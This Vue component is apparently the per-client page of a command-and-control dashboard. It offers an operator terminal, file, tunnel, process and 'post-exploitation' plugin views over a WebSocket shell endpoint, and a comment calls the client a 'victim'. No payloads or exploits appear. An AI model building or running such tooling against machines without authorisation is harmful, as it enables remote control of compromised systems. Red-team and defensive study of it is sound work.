<template>
  <div class="client-detail">
    <!-- Top Header -->
    <div class="top-header">
      <div class="header-left">
        <h1>{{ getPageTitle() }}</h1>
        <span class="subtitle">{{ clientInfo?.hostname || clientId }} | {{ clientInfo?.ip || 'N/A' }} | {{ clientInfo?.username || 'N/A' }}</span>
      </div>
      <div class="header-right">
        <el-button @click="handleReturnToList">返回列表</el-button>
      </div>
    </div>

    <!-- Main Layout -->
    <div class="main-layout">
      <!-- Left Sidebar with Menu + Client Info -->
      <div class="left-sidebar">
        <!-- Menu -->
        <el-menu
          :default-active="activeMenu"
          @select="handleMenuSelect"
          class="sidebar-menu"
        >
          <el-menu-item index="terminals">
            <el-icon><Monitor /></el-icon>
            <span>终端</span>
          </el-menu-item>
          <el-menu-item index="files">
            <el-icon><Folder /></el-icon>
            <span>文件管理</span>
          </el-menu-item>
          <el-menu-item index="tunnels">
            <el-icon><Connection /></el-icon>
            <span>隧道管理</span>
          </el-menu-item>
          <el-menu-item index="processes">
            <el-icon><Fold /></el-icon>
            <span>进程管理</span>
          </el-menu-item>
          <el-menu-item index="plugins">
            <el-icon><Tools /></el-icon>
            <span>插件/工具</span>
          </el-menu-item>
        </el-menu>
      </div>

      <!-- Right Content Area -->
      <div class="right-content">
        <router-view v-slot="{ Component }">
          <transition name="fade" mode="out-in">
            <component 
              :is="Component" 
              :client-id="clientId" 
              :client-info="clientInfo"
              :socket="socket"
              ref="childRef"
            />
          </transition>
        </router-view>
      </div>
    </div>
  </div>
</template>

<script setup>
import { ref, computed, onMounted, onUnmounted, watch } from 'vue'
import { useRoute, useRouter } from 'vue-router'
import { Monitor, Folder, Connection, Back, Close, Fold, Tools, Collection, Search } from '@element-plus/icons-vue'
import api from '../api/index'
import { ElMessage } from 'element-plus'

const route = useRoute()
const router = useRouter()

const clientId = computed(() => route.params.id)
const clientInfo = ref(null)

// Determine active menu based on current route
const activeMenu = computed(() => {
  const name = route.name
  if (name === 'ClientTerminals') return 'terminals'
  if (name === 'ClientFiles') return 'files'
  if (name === 'ClientTunnels') return 'tunnels'
  if (name === 'ClientProcesses') return 'processes'
  if (name === 'ClientPlugins') return 'plugins'
  return 'terminals'
})

const handleMenuSelect = (index) => {
  const routeMap = {
    terminals: 'ClientTerminals',
    files: 'ClientFiles',
    tunnels: 'ClientTunnels',
    processes: 'ClientProcesses',
    plugins: 'ClientPlugins'
  }
  router.push({ name: routeMap[index], params: { id: clientId.value } })
}

const getPageTitle = () => {
  const titleMap = {
    'ClientTerminals': '终端',
    'ClientFiles': '文件管理',
    'ClientTunnels': '隧道管理',
    'ClientProcesses': '进程管理',
    'ClientPlugins': '插件与后渗透'
  }
  return titleMap[route.name] || '终端'
}

const fetchClientInfo = async () => {
  try {
    const res = await api.get('/api/clients')
    const client = res.data.find(c => c.uuid === clientId.value)
    if (client) {
      clientInfo.value = client
    } else {
      ElMessage.error('客户端不存在')
      router.push('/clients')
    }
  } catch (e) {
    ElMessage.error('无法获取客户端信息')
  }
}

const socket = ref(null)
const childRef = ref(null)
let pingInterval = null

// Handle return to list - clear terminal history
const handleReturnToList = () => {
  // Clear localStorage for this client's terminal history
  const storageKey = `terminal_history_${clientId.value}`
  localStorage.removeItem(storageKey)
  console.log('[ClientDetail] Cleared terminal history for', clientId.value)
  
  // Navigate back to clients list
  router.push('/clients')
}

const initSocket = () => {
  // Use the Admin Shell endpoint for this specific client
  const protocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:'
  // Determine the correct host (prefer current hostname to avoid localhost issues in prod)
  const host = window.location.host // includes port
  const token = localStorage.getItem('cupcake_token')
  const wsUrl = `${protocol}//${host}/api/shell/${clientId.value}?token=${encodeURIComponent(token)}`

  console.log('[ClientDetail] Connecting to WebSocket:', wsUrl)
  socket.value = new WebSocket(wsUrl)

  socket.value.onopen = () => {
    console.log('[ClientDetail] WebSocket Connected')
    // Register logic if needed, or backend handles it automatically on connection
    // But per requirements, register sends JSON. 
    // Usually the Client (victim) registers. 
    // The Dashboard (us) just listens?
    // The instructions say: "GET /ws: WebSocket Upgrade...". 
    // "POST /api/cmd: receive JSON ... find correspond WebSocket".
    // This implies we are the Dashboard.
    
    // Keep alive if needed
    pingInterval = setInterval(() => {
        if (socket.value?.readyState === WebSocket.OPEN) {
            socket.value.send(JSON.stringify({ type: 'ping' })) 
        }
    }, 30000)
  }

  socket.value.onmessage = (event) => {
    // Forward to the active child component (TerminalTabs, FileManager, etc.)
    if (childRef.value?.handleSocketMessage) {
        childRef.value.handleSocketMessage(event)
    }
  }

  socket.value.onclose = () => {
    console.log('[ClientDetail] WebSocket Closed')
    // Reconnect logic could be added here
  }

  socket.value.onerror = (error) => {
    console.error('[ClientDetail] WebSocket Error:', error)
  }
}

onMounted(() => {
  fetchClientInfo()
  initSocket()
})

onUnmounted(() => {
  if (pingInterval) clearInterval(pingInterval)
  if (socket.value) socket.value.close()
})

// Refresh client info when ID changes
watch(clientId, () => {
  fetchClientInfo()
})
</script>

<style scoped>
.client-detail {
  height: 100%;
  display: flex;
  flex-direction: column;
  background-color: #f5f7fa;
}

/* Top Header */
.top-header {
  display: flex;
  justify-content: space-between;
  align-items: center;
  padding: 16px 24px;
  background-color: #ffffff;
  border-bottom: 1px solid #ebeef5;
  flex-shrink: 0;
}

.header-left h1 {
  margin: 0;
  font-size: 20px;
  font-weight: 600;
  color: #303133;
  line-height: 1.4;
}

.header-left .subtitle {
  font-size: 13px;
  color: #909399;
  font-family: 'JetBrains Mono', monospace;
  margin-left: 16px;
}

.header-right {
  display: flex;
  gap: 10px;
}

/* Main Layout */
.main-layout {
  flex: 1;
  display: flex;
  overflow: hidden;
  min-height: 0;
}

/* Left Sidebar */
.left-sidebar {
  width: 220px;
  background-color: #2b2d30;
  display: flex;
  flex-direction: column;
  border-right: 1px solid #1a1c1e;
  flex-shrink: 0;
}

.sidebar-menu {
  background-color: transparent !important;
  border: none;
  flex-shrink: 0;
}

:deep(.el-menu-item) {
  color: rgba(255, 255, 255, 0.65);
  transition: all 0.3s;
  height: 50px;
  line-height: 50px;
}

:deep(.el-menu-item:hover) {
  background-color: rgba(255, 255, 255, 0.1);
  color: #ffffff;
}

:deep(.el-menu-item.is-active) {
  background-color: #4e5155;
  border-left: 4px solid #409EFF;
  color: #ffffff;
  font-weight: 600;
}

/* Client Info Card */
.client-info-card {
  margin: 20px;
  padding: 16px;
  background-color: rgba(255, 255, 255, 0.05);
  border: 1px solid rgba(255, 255, 255, 0.1);
  border-radius: 8px;
  flex-shrink: 0;
}

.card-title {
  display: flex;
  align-items: center;
  gap: 8px;
  font-size: 16px;
  font-weight: 600;
  color: #ffffff;
  margin-bottom: 16px;
  padding-bottom: 12px;
  border-bottom: 1px solid rgba(255, 255, 255, 0.1);
}

.card-item {
  display: flex;
  justify-content: space-between;
  margin-bottom: 10px;
  font-size: 13px;
}

.card-item .label {
  color: rgba(255, 255, 255, 0.5);
}

.card-item .value {
  color: rgba(255, 255, 255, 0.85);
  font-family: 'JetBrains Mono', monospace;
}

/* Right Content */
.right-content {
  flex: 1;
  padding: 5px;
  overflow: hidden;
  display: flex;
  flex-direction: column;
  min-height: 0;
}

:deep(.right-content > div) {
  flex: 1;
  display: flex;
  flex-direction: column;
  min-height: 0;
}

.fade-enter-active,
.fade-leave-active {
  transition: opacity 0.2s ease;
}

.fade-enter-from,
.fade-leave-to {
  opacity: 0;
}
</style>

